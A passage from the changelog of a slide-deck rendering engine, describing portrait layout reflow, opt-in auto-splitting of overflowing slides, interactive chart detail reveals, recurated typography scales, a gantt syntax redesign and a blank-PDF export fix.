  counter is set in `--fs-message`, which grows toward portrait, but the index gutter was a
  fixed step — so the number cleared the question in landscape yet ran straight into it
  ("01Why…") on a portrait/mobile slide. The gutter is now proportional to the index, and
  the index reads as a label (`--fs-message * 0.8`) rather than a second headline, so it
  keeps a constant gap in every orientation and every variant (the `solo` variant re-bases
  the same token so its larger number clears too). Body type is unchanged — still the shared
  role sizes, consistent with every other layout.
- **`statute-stack` cards are denser on portrait — the status pill lifts to the corner.** On
  single-column (portrait/mobile) cards the status pill now rides the card's top-right
  corner, centred on the jurisdiction label's midline with breathing room above the body,
  reclaiming the full row it used to hold at the card's foot (more cards per page, fewer
  split slides). Landscape's equal-height grid keeps the foot-anchored pill (lifting it
  there would leave an empty card bottom).
- **A 4th stat no longer clips off a portrait `stats` slide.** Portrait stats stacks
  and *enlarges* the hero numbers; the stack's `gap` was `--sp-2xl`, but with
  `space-evenly` the gap is only a floor — an over-large floor pushed a 4th enlarged
  number off the shortest portrait (4:5). Dropped to `--sp-sm`: the sparse 3-stat case
  is visually unchanged (`space-evenly` redistributes the surplus) while the dense
  4-stat case now packs to fit. Layout-only; landscape byte-identical.

### Changed

- **The Form footer is redesigned as independently-positionable Cells.** On
  `form:` decks the three footer zones (running text · progress rail · page number)
  are now real Cells, each positioned by its own `var(--<cell>-inset)` token so a
  Frame's `slicing` can relocate any one freely (the infinite-layouts contract,
  `design/forms.md §7.3`). The default groups the progress rail with the page
  number at bottom-right (same size + baseline) instead of floating the rail in
  dead-centre, and the running text sits bottom-left; the legacy magic-number
  `has-progress` footer-yield is retired. Non-`form` decks are unchanged. This also
  makes the footer a real relocation target for the masthead bay, unblocking the
  Fit Spine's P3 cross-band relocate.

- **Every component now declares its layout-solver intent** — `adapt.priority` is
  complete across all 52 components (was 23/52), with `keepTogether` on the atomic
  members/pairs (26/52). These are the inputs the Fit Spine's solver reads to choose
  collapse / shed / split instead of guessing — the §6 backfill, applied per a written
  rubric (`engineering/decisions/2026-06-22-solver-intent-backfill.md`) and
  checker-verified against each component's real structure (which caught and reverted
  a `logo-wall` shed the strip CSS doesn't honor). Metadata only — no render change
  yet; the catalog (`dist/docs/components.json`) carries the new fields. A new
  `build:check` gate (`checkSolverIntentDeclared`) keeps coverage from regressing —
  a component can't land without declaring `adapt.priority`.

- **The `kanban` board is redesigned to spend colour on STATUS, not category.**
  The default board is now a calm grid of uniform, elevated, neutral cards
  ("premium card"): the per-card lane gradient, the 3px coloured left stripe, the
  colour dot, and the bordered size chip are gone, and colour on the card surface
  is reserved for the status vocabulary — so a flagged card is the focal point
  instead of a paint-swatch patchwork. Category colour coding is retained as **two
  opt-in variants** (a new "Colour coding" axis): `keyline` colour-codes each card
  by category with a single crisp left edge, and `tinted` colour-codes the columns
  by pipeline stage. Pure CSS + manifest change — no DOM/authoring change, so every
  existing kanban deck re-renders into the calm default with no edits. See
  `engineering/decisions/2026-06-22-kanban-chart-redesign.md`.
- **Breaking: the `gantt` authoring contract is redesigned — typed tokens, a
  continuous time axis, milestones, and dependencies.** The nested-list shape is
  unchanged (lane → task), but the inline-code tokens are now *typed and
  validated* instead of sniffed: a span is `START..END` (a bar) or a single time
  point (a milestone diamond), `..` is the **only** delimiter (the old
  `→ / – / ->` are retired and flagged with a "use `..`" lint error), and a task
  may carry a status, an `after: Task name` dependency (validated, not drawn),
  and an optional `milestone` keyword. Time points are real **ISO dates**
  (`2026-03-15`), quarters (`Q1` / `2026 Q1`), or months (`Jan`) on one
  *continuous* scale — bars are now day-accurate, not snapped to columns — and a
  chart uses dates **or** ordinals, not both. The axis auto-derives from the
  data; the eyebrow may override it (`START..END`) and add an opt-in
  `today <point>` line. The linter gained gantt checks (retired delimiter, bad
  span/status, dangling or inverted `after:`, mixed time vocabularies).
  **Migration:** replace the span delimiter with `..`, and where a lone `Q1` was
  a one-quarter *bar* write `Q1..Q1` (a lone point is now a milestone). See
  `engineering/decisions/2026-06-21-gantt-component-redesign.md`.

- **state-chart is simpler: status folds into the index badge, not a pill per
  node.** A state machine should read as *flow*, so the wide per-node
  `on-track`/`live` text pills (which widened the column and collided the spine
  labels with the nodes, especially in the vertical `curved` variant) are gone.
  The top-right **index numeral now doubles as the status badge** — the number is
  the state's ID, its colour is the status — decoded by a compact **legend** band
  below the chart (mirroring journey's glyph-in-a-disc + legend). Status-less
  states keep a quiet plain numeral. Same status keyword vocabulary, same
  AA-vetted tones; authoring is unchanged and the D3-style edge router is
  untouched. See `engineering/decisions/2026-06-20-state-chart-simplify.md`.

### Added

- **Dense list layouts split with a cover, then their OWN native cards (`cover-paginate`).**
  Five dense list/register layouts — **statute-stack**, **regulatory-update**,
  **authority-chain**, **q-and-a** (legal/inventory), and **glossary** — now auto-split
  instead of clipping, with `autosplit: on`. Unlike the read-across carousels (which
  re-author the body into generic rows), `cover-paginate` keeps the layout's *own* finish:
  an accent **cover** (heading hero + the manifest `split.intro` lead-in + any eyebrow)
  leads into the layout's native cards paginated across clean pages — the bordered statute
  cards, the numbered regulatory rows, the authority chain's connectors, the Q/A counters,
  the glossary's term/definition table (its `<thead>` repeats per page). The cover is one
  shared accent field for the whole batch; the bodies stay byte-for-byte native. The body
  cut is sized from the measured overflow so it lands in balanced pages, and a re-split
  guard lets a still-dense page paginate further without growing a second cover. Demo:
  `examples/cover-paginate.md`. See `engineering/decisions/2026-06-23-read-across-carousel.md`.
- **Auto-split connective chrome — a cover lead-in and a progress rail tie a split
  set together.** Every carousel cover now carries a per-layout, manifest-declared
  lead-in (`split.intro`, e.g. compare-prose "Side by side →", decision "The
  reasoning →") so the cover *introduces* the pages that follow rather than just
  titling them — the forward pull a good auto-split has. And every split slide (carousel
  or plain pagination, ≥2 parts) gets a small **k-of-N progress rail** that lights through
  the current page, so a reader can see they are inside a sequence and how far along.
  The rail rides the deck pagination's baseline in the bottom-right but stands well clear
  of the page number, so sub-sequence progress and deck position read as two distinct
  signals. Both the lead-in and the rail use `currentColor`, so they sit correctly on the
  accent cover and the body pages alike. Layout chrome only; opt-in via `autosplit: on`.
  See `engineering/decisions/2026-06-23-read-across-carousel.md`.
- **Read-across carousel — the family is complete, on one cover finish (decision,
  compare-code, + a compare-prose fidelity fix).** With `autosplit: on`, the last
  read-across layouts now split instead of clipping, all wearing the *same* accent
  cover→content finish so a split reads as the same deck, just more of it:
  **decision** → the verdict is the cover, its justifications window beneath;
  **compare-code** → a title cover, then one code block per page at full width (two
  blocks never fit a portrait box). And **compare-prose's** earlier *editorial* finish
  (drop-caps, pull-quote) — judged a step off the deck — is **retired for `cover-sides`**
  (cover → one subject per page → verdict) to match split-panel, the fidelity bar. A
  shared `coverWindow` builder backs the family. On the jargon deck in portrait, overflow
  now falls **27 → 2** (the last two are genuine floor cases — a single card taller than
  the page). **Breaking:** an `autosplit: on` deck's overflowing compare-prose now renders
  as cover→sides, not the editorial drop-cap sequence. See
  `engineering/decisions/2026-06-23-read-across-carousel.md`.
- **Read-across carousel — list-tabular joins (the `cover-rows` strategy).** With
  `autosplit: on`, an overflowing **list-tabular** re-authors at export into a title
  **cover** followed by its rows windowed onto clean pages — the *same* accent
  cover→content finish approved for split-panel, so a split table reads as the same deck,
  not a different one. Chosen from a 5-variant render-off (cards / cover→rows / refined
  ledger / two-up grid / numbered register). Shares the `coverWindow` builder with
  split-panel's `feature-cover`. **compare-table** continues to paginate its rows with a
  repeated `<thead>` (its columns are the comparison — they stay a table). On the jargon
  deck in portrait, overflow falls 6 → 5. See
  `engineering/decisions/2026-06-23-read-across-carousel.md`.
- **Read-across carousel — split-panel joins (the `feature-cover` strategy).** An
  overflowing **split-panel** (a featured panel beside its supporting points) now
  re-authors at export into a **feature cover** — the watermark/heading/lede get a
  full accent cover — followed by the supporting points flowed onto clean pages under
  a running header (`perPage` at a time), rather than clipping. Same opt-in
  (`autosplit: on`), same manifest-declared `split` recipe and shared `carouselize`
  kernel as compare-prose; the treatment (SP3) was picked from a 3-candidate render-off.
  On the jargon deck in portrait, overflow now falls 27 → 6. See
  `engineering/decisions/2026-06-23-read-across-carousel.md`.
- **Read-across carousel — an overflowing comparison becomes a sequence, not a clip
  (opt-in).** A read-across layout reads *across* its sides (compare-prose's two facing
  columns), so it can't be divided between members the way a list can — past its box it
  would clip. With `autosplit: on`, an overflowing **compare-prose** is now re-authored
  at export as a short editorial **carousel**: a cover that promises "two readings", one
  drop-cap article page per side, and a pull-quote verdict from the slide's synthesis
  line. The comparison is *staged*, never sliced; each frame stands alone and reads in
  order, with no shrinking and no author config. The recipe (`editorial`, the C4
  treatment picked from a 5-candidate render-off) is **manifest-declared** — the layout
  owns its split-forms (`split` block) — and applied by a pure transform
  (`lib/core/carousel.js`) wired into the auto-split measured loop; a section that
  doesn't parse as the expected shape is left for the overflow ring, never emitted
  broken. Opt-in, so existing decks render unchanged. On the jargon deck in portrait
  this took overflow from 27 → 8. Demo: `examples/read-across-carousel.md`. See
  `engineering/decisions/2026-06-23-read-across-carousel.md`. *(split-panel /
  compare-code and the tabular family are on deck.)*

- **Auto-split — an over-capacity slide divides into several, automatically (opt-in).**
  Add `autosplit: on` to a deck's front-matter and, at export, any slide that overflows
  its box is divided into several slides that each fit — the heading repeats (marked
  `(cont.)`), ordered lists renumber, nothing is lost. The honest fix for overflow is
  more slides, not smaller type (below the readable type floor the engine has nothing
  smaller to reach for). Two passes, one kernel: a cheap **count-based** pre-cut splits
  a slide past its layout's `capacity.hard`, then a **measured** loop renders the deck
  headless, finds the slides that *actually* clip (by their `scrollHeight/clientHeight`
  ratio), and divides each by that ratio — re-rendering and re-measuring until the deck
  fits. The measured pass is what catches **density** overflow (few but tall items that
  no count threshold sees) — the dominant cause in a tall/portrait box, where the
  count pass alone fires nothing. Read-across content (table columns, code, compare
  panes) is never split — it escalates to a sibling layout instead. Drives the
  `partitionAxis` kernel from each component's capacity contract; build-time only (the
  spine rejects live re-pagination). Opt-in, so existing decks and the curated galleries
  render byte-for-byte unchanged. The capacity-overflow lint warning is suppressed on
  `autosplit` decks (the split resolves it). Demo: `examples/auto-split.md`. See
  `engineering/decisions/2026-06-22-the-fit-spine.md` §3 and `lib/core/auto-split.js`.

- **Per-task interactive detail on the gantt chart (Tier-2 detail reveal).** A
  nested bullet under a task (one level below the task — plain prose: the owner,
  the blocker, the why) is now captured as that bar/milestone's reveal detail
  (previously a deeper bullet had no meaning). On screen (Drawing Board
  present/practice/preview) the bar/milestone reveals it in a popover on
  hover/tap, with the active bar lifted + glowing and the rest dimmed
  (reveal-only — no 3D tilt, which would skew the time axis); in the exported PDF
  the same detail folds into the slide's speaker note. A chart with no detail
  bullets is unchanged. Reuses the shared HTML-mark reveal path the state-chart
  laid down (the tilt is now scoped to SVG sheets + the state-chart graph, so
  HTML grids never tilt). See
  `engineering/decisions/2026-06-20-chart-detail-reveal-family.md`.
- **Responsive-Frame slicing — the `standard` Form re-slices its masthead per
  aspect family (first slice).** Form Frames gain a `slicing` block (per-family
  cell-placement; `lib/forms/schema/frame.schema.json`): the `standard` frame's
  masthead collapses to a single column (lede over bay) at `tall`/`strip`. The
  build generates the `[data-family]` rules from each Frame's manifest; the runtime
  stamps `data-family` from the live box (`lib/adaptive/families.js`). **Runtime
  only** (fluid viewer + playground) — a fixed, runtime-less export is byte-
  unchanged (the `wide` default is unstamped). Cross-band cell *relocation* and the
  `slicing` validation gate are follow-up slices; see
  `engineering/decisions/2026-06-21-reflow-as-form-capability.md`.

- **Per-state interactive detail on the state-chart (Tier-2 detail reveal).** A
  nested bullet under a state that is *not* a transition (plain prose — the
  entry/exit action, the rule, the "why") is now captured as that state's reveal
  detail (previously such bullets were silently dropped). On screen (Drawing
  Board present/practice/preview) the state node reveals it in a popover on
  hover/tap, with the active node lifted, the rest dimmed, and the whole figure
  tilting; in the exported PDF the same detail folds into the slide's speaker
  note. A machine with no prose bullets is unchanged. Extends the shared
  chart-family detail substrate to **HTML marks** (the reveal layer gained an
  HTML-mark path that gantt/kanban will reuse; the edge-router skips re-measuring
  while the tilt is live, so the routed edges stay aligned even when the Drawing
  Board scales the slide to fit). See
  `engineering/decisions/2026-06-20-chart-detail-reveal-family.md`.

- **Fluid-box viewer mode — read a fixed deck responsively on a phone.** A new
  `lattice-emulator … --fluid` flag emits the deck's `.html` as an opt-in
  *viewer*: each slide sizes to the viewport instead of the authored fixed box,
  so on a phone it reflows to portrait — one slide per screen, vertical
  swipe/snap, the recurated portrait type scale and every component's tall layout
  firing from the already-shipped runtime. A pill toggles back to the authored
  fixed deck (the default on a laptop; `?view=fluid`/`#fluid` forces it). Enable
  it per-render with `--fluid` or per-deck with a `fluid: true` front-matter key.
  The mode is **additive and export-safe**: the PDF/PPTX/PNG and the canonical
  export HTML are byte-unchanged (the raster path renders the clean HTML; the
  viewer is written over the `.html` only after rasterization), and the fluid CSS
  (`lib/base/base.fluid-view.css`) is inert until the viewer sets
  `:root[data-lattice-view="fluid"]`. Known limit
  for this first slice: a slide that overpacks a phone screen can still overflow
  (autofit / re-pagination are sequenced follow-ups). Demo: `examples/fluid-box.md`
  (generate the viewer with `--fluid`). See
  `engineering/decisions/2026-06-21-fluid-box-viewer-design.md`.

- **Per-mark interactive detail on funnel, map, quadrant, and radar charts** —
  the pie's authored-detail pattern, generalized into a shared chart-family
  substrate (`mark-detail.js`) and a chart-agnostic reveal layer. Author an
  optional nested sublist under a funnel stage, a map region, a quadrant item, or
  a radar **axis** and it drives two surfaces from one source: on screen
  (Drawing Board present/practice/preview) the mark reveals its detail in a
  popover on hover/tap/number-key, with an interaction-coupled tilt; in the
  exported PDF the same detail folds into the slide's speaker note (a text
  annotation — the chart pixels stay byte-identical). A chart with no sublists is
  unchanged. Radar reveals per-axis. See
  `engineering/decisions/2026-06-20-chart-detail-reveal-family.md`.

### Changed

- **Interactive chart reveal now has two depths.** In the Drawing Board
  (present / practice / live preview), hovering/tapping a mark on an interactive
  chart still reveals *every* mark (the data-viz "details-on-demand" standard),
  but a mark with **no authored detail** now shows a compact value-on-hover
  **tooltip chip** (dot · label · value) instead of the full detail card; marks
  that authored a detail sublist still show the rich card (body + meta). Applies
  family-wide (pie/funnel/map/quadrant/radar — the shared reveal layer). No
  change to the interaction model or any exported artifact. See
  `engineering/decisions/2026-06-21-chart-reveal-lean-tooltip.md`.
- **The portrait font scale is recurated for on-device legibility.** All 12
  portrait `--fs-*` tokens were re-derived as one coherent ramp anchored on
  `body` = ~47px in-frame — which maps to ~17px on a phone (the iOS body floor),
  so an emailed-link reader can actually read body prose instead of ~13px
  fine-print. The title ramp is *compressed* (display tiers rise less than body,
  so the body→h1 span tightens 2.44×→2.08×) so a two-line `h1` still fits a 9:16
  frame, and the role aliases are re-locked (`h6=meta`, `h5=body`, `h4=message`)
  to match the landscape/square scales — the old portrait set had drifted (`h4`
  below `message`). **Landscape and square are unchanged** (byte-identical
  exports). Bigger type means less fits per slide: a few content-dense portrait
  decks were trimmed to stay within the frame. See `lib/typography/scale.js` and
  `engineering/decisions/2026-06-20-typography-categories.md`.

- **Adaptivity is now a required, gated manifest declaration.** Every component
  carries `adapt.mode` ∈ `reflow` (ships per-family structural layouts) ·
  `native` (adapts by cqi scaling + orientation-aware type) · `single-orientation`
  (deliberately one orientation). A CI gate (`check-ownership` +
  `adapt-contract.test.js`) cross-checks the declaration against reality — any
  component whose CSS uses `@container … aspect-ratio` MUST be `reflow` — so the
  manifest can never silently drift from the code again. Fixes the prior gap (10
  declared adaptivity, 25 actually adapt, nothing caught it). Backfilled all 52
  (26 reflow / 23 native / 3 single-orientation); `components.json` now surfaces
  the mode. See `engineering/decisions/2026-06-20-adaptive-manifest-contract.md`.
- **Two `adapt.mode` reclassifications** (native→reflow feasibility study):
  - `split-panel` `native → reflow` — it structurally flips its section axis
    (`flex-direction: row → column`) in portrait via `[data-orientation]`, so
    `native` understated it; the catalog now reports `reflow`. No render change.
  - `compare-table` `native → single-orientation` (`orientation: ["landscape"]`) —
    render-verified as below-bar in portrait (survives but ballooned/cramped); it
    now warns when used in a portrait deck, like its sibling `compare-code`.
  See `engineering/decisions/2026-06-20-native-to-reflow-feasibility.md`.
- **Legal-bucket layouts now reflow to a single column in portrait** (native →
  reflow, Batch A1 of the feasibility study). `statute-stack`, `authority-chain`,
  and `regulatory-update` collapse their multi-column grids to one full-width
  column on a square/tall/strip box via `@container lattice (aspect-ratio …)`, so
  they also reflow inside a narrow nested cell — not just a portrait deck.
  `citation-card`'s multi-column variants (`split`, `triptych`, `margin`) collapse
  on a portrait/square deck via the `[data-orientation]` stamp (their grids live
  on the section element, which a container query can't restyle — the same §11
  boundary `split-panel` rides). Landscape renders byte-identically. Demo:
  `examples/reflow-legal.md`. See
  `engineering/decisions/2026-06-20-native-to-reflow-feasibility.md`.
- **Typography is now three curated per-orientation scales, not one scale × a
  multiplier.** Font size was `landscape_coefficient × cqi × --canvas-scale`,
  where `--canvas-scale` was a single uniform multiplier that *stretched* the
  landscape hierarchy to fake portrait (and which raw-`cqi` sizes like pills and
  corner tags never saw, so they collapsed to fine print on a tall box). The
  `--fs-*` tokens now come from a single manifest (`lib/typography/scale.js` +
  `emit.js`) carrying **curated `landscape` / `square` / `portrait` coefficient
  sets**, selected per slide off `data-orientation`. Landscape coefficients are
  unchanged and landscape renders stay byte-identical; `square`/`portrait` are
  tuned for legibility at presentation distance and to fill a tall frame.
  `--pill-fs` now follows the per-slide orientation (was baking in the landscape
  size). `--canvas-scale` is retired for type (spacing still uses it). A
  drift-guard test bans new raw-`cqi` font-sizes. See
  `engineering/decisions/2026-06-20-typography-categories.md`.
- **The `image gallery` composition is now a passe-partout picture frame.** It
  was a contain-on-a-matte panel that pillarboxed non-landscape assets (dead
  space left/right) with little padding. The frame now **hugs the asset's
  aspect** — square, wide, or tall — so there's no dead space, and the padding is
  a deliberate **mat** (the photo sits inside, the surface shows around it) with
  an inner bevel hairline, a slim frame line, and a hard, PDF-safe lift shadow.
  Caption is a centred Title + body placard below the frame. Palette-blind
  (works light + dark). See `engineering/decisions/2026-06-19-adaptive-image.md`.

### Added

- **Reveal a pie slice's detail in the live editing preview — as you author.** Hovering
  (or tapping, on touch) a pie wedge in the **Drawing Board AND Playground** previews now
  pops the slice's authored detail (label · value · notes), so you can verify it without
  entering Present and paging to the slide. Reuses the parent-hosted Present/Practice
  interaction layer, extended with a hover mode that listens on the (same-origin) preview
  iframe and reveals whichever chart is under the pointer — scoped to that chart's own
  legend/detail. The popover is positioned by **Floating UI** (`@floating-ui/dom`, the
  engine shadcn/Radix use) via a virtual reference built from the chart geometry — real
  flip/shift/collision handling across the iframe boundary, not a hand-rolled clamp — and
  its chrome uses the **site palette tokens** (flips light/dark). Parent-overlay only:
  **the exported SVG/PDF is untouched**. Fine pointer reveals on hover, coarse on tap;
  number keys still work. Verified on both surfaces, light + dark, at 1440/820/390px.
  Completes the pie per-slice detail trio (Present reveal · PDF speaker note · in-editor
  preview). See `engineering/decisions/2026-06-19-css-3d-charts-feasibility.md`.
- **Nine more components now reflow to a tall box (component adaptive-sizing
  sweep, batch 2 / Tier-A).** `logo-wall`, `list-tabular`, `glossary`, `q-and-a`,
  `actors`, `decision`, `compare-prose`, `list-steps`, and `math` each restructure
  when rendered in a portrait/tall box instead of crushing a wide layout into a band:
  multi-column walls and grids collapse to fewer columns, horizontal card strips stack
  vertically, side-by-side panels go single-column, and the two-column math
  hero/legend stacks. Authored once — no per-size variant — the reflow fires
  purely from the box's aspect crossing a family boundary (`wide · square · tall
  · strip`); **landscape output is unchanged** (the `@container` query is inert
  above 1.05 aspect, and the section-element variants key on `[data-orientation]`).
  Each component's manifest gains an `adapt` block (`families` + `priority`).
  `obligation-matrix` is deferred — a true 2-D matrix whose column semantics
  can't survive a CSS-only stack. (Legal-bucket layouts reflowed separately in
  batch A1, #464.) See
  `engineering/decisions/2026-06-18-component-adaptive-sizing.md` §13 and
  `examples/adaptive-sweep.md`.

- **`piechart` per-slice detail now reaches the static PDF — as the slide's speaker
  note.** A slice's optional nested sublist already powered the Present/Practice reveal
  popover but rendered nothing in the exported PDF, so a cold-open / emailed reader lost
  it. The same authored detail is now folded into the slide's **speaker note**
  (`Label (value): item · item`, one line per detailed slice) as a Marp-faithful comment,
  which `notes-core` lifts into the per-slide note channel (a PDF text annotation + the
  hidden `aside`). Because the note rides the existing channel and the comment is stripped
  before render, the **chart pixels stay byte-identical** (verified: 0-px diff vs a plain
  pie) — the detail surfaces off the slide face, not on it. Always-on for any pie with a
  detail sublist; a plain pie emits no note and is unchanged. See
  `engineering/decisions/2026-06-19-css-3d-charts-feasibility.md` and `examples/pie-detail-notes.md`.

- **`image` is now content- AND orientation-adaptive — it resolves its own
  composition.** The author hands `image` an arbitrary rectangle (phone crop,
  portrait photo, panorama); the layout reads the asset's intrinsic aspect at
  build time and, with the deck orientation, **resolves one of five
  compositions** rather than making the author pick a modifier per asset:
  **clean** (the default — a floated card whose *aspect adapts to the photo*, so
  the crop is ≈ zero), **split** (an extreme-aspect photo shown whole — a
  full-height column or full-width band), **spotlight** (full-bleed cover with a
  solid text card, when the photo already matches the canvas), plus opt-in
  **gallery** (contain-on-matte for diagrams) and **statement** (full-bleed +
  scrim + editorial title). The resolver is **risk-gated** — it only auto-fires
  treatments that can't lose or obscure an unseen photo — and an explicit
  composition class always wins, so an author can force `image spotlight` (cover
  + crop) on any asset. Legacy `full` / `contain` / `museum` map onto
  spotlight / gallery / gallery for back-compat. See
  `engineering/decisions/2026-06-19-adaptive-image.md`.

- **`roadmap` adapts to a portrait box — and Phase 4 chart adaptivity is complete.**
  The wide workstream × phase table letterboxes on a tall deck (columns crushed,
  header collisions). On a portrait deck the kernel now **auto-selects the
  `horizons` card form** — the phase cards **stack into a single column** down the
  page, the header collapses to one row (eyebrow · title) and each workstream row
  goes single-line so a 3–4 phase roadmap fits. All roadmap treatments (status /
  swimlane / milestones) unify to the horizons stack in portrait. Keyed on the
  deck's `data-orientation`; **landscape is unchanged**. This completes the chart
  family's portrait adaptivity — every chart that used to letterbox now restructures
  to the box it occupies. See
  `engineering/decisions/2026-06-19-chart-adaptive-sizing.md` §10 and
  `examples/portrait-roadmap.md`.

- **`piechart` slices can carry per-slice detail for a present-mode popover.** A slice
  may now nest a sublist (`- Slice \`46%\`` then an indented `  - …`); the kernel keeps
  the label/value exactly as before and emits the sublist as an **inert
  `<template class="chart-detail" data-mark="i">`** (inside a `.chart-details` wrapper)
  alongside the figure, and tags every wedge `<path>` with `data-mark="i"` — the same
  shared chart-family detail substrate funnel/map/quadrant/radar use. The `<template>`
  is zero-footprint on the slide face, so the **chart pixels are byte-identical** and a
  deck without sublists is unchanged. (The static-PDF surfacing of the detail then
  shipped as the speaker-notes channel — see the `### Added` entry above; that adds a
  PDF note annotation without touching the pixels.) Authoring:
  `lib/components/chart/piechart/piechart.docs.md` › "Per-slice detail".

- **Present & Practice reveal per-slice chart detail interactively.** In the Drawing
  Board's present and practice modes, an interactive chart slice now lets you reveal a
  slice's detail in a floating popover — by **hovering it** (mouse), **tapping it**
  (touch), or pressing its **number key** (1–9 → slice n, 0/Esc clears); the active
  wedge lifts, the rest dim, with a restrained interaction-coupled tilt that settles
  flat. It's parent-hosted so the slide iframe stays a pure paint surface (the exported
  PDF is untouched): the chart owns only its own rectangle, while swipe / edge-arrows /
  keyboard keep driving navigation. Practice pauses autoplay while you explore. New
  module `docs/src/playground/drawing-board-chart-interact.js`; the architecture +
  why-iframe rationale live in
  `engineering/decisions/2026-06-19-css-3d-charts-feasibility.md`.

- **`journey` adapts to a portrait box with a vertical board (Phase 4 — completes it).**
  On a tall deck the landscape journey (horizontal stages, dangling mood faces)
  letterboxed into a band. Portrait now emits a purpose-built vertical board: stages
  stack down the page as grouped sections, each task is a row (actor dots + label),
  and mood reads two ways at once — the row is **washed** by mood (pain warm →
  delight cool) and the face is **plotted** by mood along a pain→delight track with a
  dashed reach to the spine, so a dip like a `:1` task pops as a pink row with the
  sad face pulled to the edge. Stages grow proportional to their task count; the five
  variants fall back to this unified vertical view in portrait. Keyed on the deck's
  `data-orientation`; **landscape is unchanged**. With this, every chart adapts to a
  tall box (only `roadmap` remains from the Phase 4 queue). See
  `engineering/decisions/2026-06-19-chart-adaptive-sizing.md` §10 and
  `examples/portrait-journey.md`.

- **`gantt` and `state-chart` adapt to a portrait box (Phase 4, native charts).**
  Both used to letterbox into a short band on a tall deck. `gantt` is an HTML/CSS
  grid, so it reflows box-local (`@container`): the lane label moves above its bars,
  the bars run full-width and the lanes distribute down the canvas. `state-chart` is
  native SVG whose default is already vertical, so it now fills the height (states
  distribute, browser-measured edges follow), and an `lr` (horizontal) machine falls
  back to the vertical `tb` default on a portrait deck. Both relax their
  `orientation` contract to include `portrait`; **landscape output is unchanged**.
  This also corrects a doc-level mislabel — `gantt`/`journey`/`state-chart` are
  native renderers, NOT Mermaid, and have no "LR→TB direction" to switch. See
  `engineering/decisions/2026-06-19-chart-adaptive-sizing.md` §10 and
  `examples/portrait-gantt-statechart.md`.
- **The four keyed charts get a portrait legend-below layout (Phase 4, render-time).**
  `piechart`, `radar`, cohort `quadrant`, and `map` bake their diagram **and** their
  legend into one wide SVG viewBox (`svg-legend.js`), so on a portrait deck the whole
  unit used to letterbox into a short band. The shared legend builder now has a
  portrait branch — the diagram sits on top, the key stacks centered beneath it with a
  horizontal accent rule between — keyed on the deck's `data-orientation` stamp. The
  builder returns a new `diagramDx` (horizontal centering offset) that the four kernels
  thread into their diagram transform; `radar` reserves extra side room so its axis
  labels don't clip. **Landscape output is byte-identical** (the right-rail path runs
  untouched when the deck isn't portrait). See
  `engineering/decisions/2026-06-19-chart-adaptive-sizing.md` §9 and
  `examples/legend-below-portrait.md`.
- **Charts restructure to a tall box — funnel fills the portrait canvas (Phase 4, render-time).**
  Charts whose layout is baked into an SVG viewBox can't be reflowed in CSS, so they
  restructure at *render time*: `funnel` now emits a tall portrait viewBox on a
  portrait deck (it filled only a short landscape band before), reading the deck's
  `data-orientation` stamp the slide pipeline already writes — no engine plumbing.
  Landscape output is byte-identical. This threading is the reusable foundation for
  the remaining render-time charts (the keyed radial/square charts via `svg-legend`,
  `roadmap`, and the Mermaid `gantt`/`journey` direction-switch). See
  `engineering/decisions/2026-06-19-chart-adaptive-sizing.md` §7.
- **Charts restructure to a tall box — sequential charts go vertical (Phases 1–2).**
  Charts previously kept their landscape internal layout and shrank into a tiny
  band on a portrait/tall slide. They now *restructure* box-locally via
  `@container lattice (aspect-ratio …)`, landscape byte-identical: `timeline-list`
  turns its left-to-right spine into a true vertical timeline (dots on a left rail,
  content filling the width); `kanban`'s side-by-side board stacks into full-width
  lanes (cards wrapping as a row within each); and `progress` distributes its bars
  down the full height with thicker tracks. This establishes the `auto 1fr` rail
  pattern; radial/square charts (`piechart`, `radar`, `quadrant`) and the
  render-time work (`funnel`/`roadmap` viewBox + Mermaid `gantt`/`journey`
  LR→TB) follow in phases 3–4. See
  `engineering/decisions/2026-06-19-chart-adaptive-sizing.md`.
- **Box-local adaptive sizing — components reflow to the box they occupy
  (pilot: 5 components).** Components now adapt their *structure* via CSS
  `@container lattice (aspect-ratio …)` queries over four box-families — `wide`
  (>1.05) · `square` (0.9–1.05) · `tall` (0.5–0.9) · `strip` (<0.5) — instead of
  the deck-wide `data-orientation` stamp. The query reads the nearest `lattice`
  container, so one rule handles a portrait deck today and (once a Cell names
  itself `lattice`) a narrow nested cell. Scale stays continuous (slide-anchored
  `cqi`); only structure steps between families. `kpi`, `list`, `matrix-2x2`,
  `cards-grid`, and `split-compare` are converted; `kpi`'s `strip` family
  additionally sheds its status pills (the declared `adapt.droppable`). The
  fully-nested case (a component tracking its *cell's* aspect, not the deck's)
  needs the engine to stamp a non-`cqi` `--_sec-1cqi` in every render path so
  cell type stays slide-anchored — that alters exported bytes, so it is staged
  behind sign-off (the foundation enables it). Manifests gain an `adapt`
  block (`adapt.families` support list + `priority` / `droppable` /
  `keepTogether` / per-family `capacity`) — declared intent the authored CSS
  honours and a future resolver can consume. Foundation: `section` is named the
  `lattice` query-container (`lib/base/base.elements.css`); the four thresholds
  live once in `lib/adaptive/families.js` (drift-guarded by a unit test). Demo:
  `examples/adaptive-sizing.md`. Landscape output is byte-identical. See
  `engineering/decisions/2026-06-18-component-adaptive-sizing.md`.
- **Box-local adaptive sizing — sweep batch 1 (5 more components).** `pricing`,
  `verdict-grid`, `stats`, `cards-stack`, and `content` now reflow box-locally via
  `@container lattice (aspect-ratio …)` — pricing/verdict-grid collapse to one
  column at `tall`/`strip`; stats/cards-stack/content reflow from `square` down
  (numbers stack and enlarge, cards de-balloon, prose measure caps). Each mirrors
  the component's existing `[data-orientation]` reflow (kept as fallback) at matched
  specificity, so a portrait deck is visually unchanged and **landscape output stays
  byte-identical** (the query is inert above 1.05 aspect); the win is that the reflow
  now also fires inside a narrow nested cell. `split-panel` is intentionally *not*
  converted — it reflows the section itself, which an `@container` rule cannot style
  (it can only style descendants), so it stays on `data-orientation` until the staged
  nested-cell foundation lands. Manifests gain an `adapt` block.
  See `engineering/decisions/2026-06-18-component-adaptive-sizing.md`.

### Fixed

- **Drawing Board export no longer produces a blank (or collapsed) PDF/PPTX.**
  Exporting straight from the Edit tab — the default path on a phone, where the
  preview pane is `display:none` and is never shown — yielded an all-white PDF.
  The one-click PDF/PPTX/chart exports rasterized the *live preview* iframe, which
  is tuned for on-screen performance: it gates the deck behind
  `.marpit{visibility:hidden}` until its in-iframe FIT agent reveals it (only once
  the preview has a width), virtualizes off-screen slides (`content-visibility`),
  and has no layout box at all when its pane is hidden — so `html-to-image`
  captured hidden (→ transparent) or unlaid-out slides (container-query `cqi/cqh`
  typography collapsing to `0`). Export now **renders into its own dedicated,
  fully-laid-out, ungated capture host** (reusing the engine's render via the
